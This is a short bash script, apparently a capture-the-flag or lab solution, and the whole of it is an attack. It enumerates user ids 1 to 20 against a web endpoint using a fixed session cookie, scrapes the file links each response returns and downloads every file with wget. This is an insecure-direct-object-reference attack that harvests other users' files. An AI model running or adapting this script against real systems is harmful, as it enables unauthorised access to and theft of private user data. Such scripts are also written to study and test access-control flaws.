#!/bin/bash

for i in {1..20}; do #num of uid
  for link in $(curl -s -X POST \
    -H "Cookie: PHPSESSID= ID" \
    -d "uid=$i" \
    http://IP/file | #ip and file 
    grep -oP "/file/[^\"']+"); do
      wget -q http://IP$link #download 
  done
done
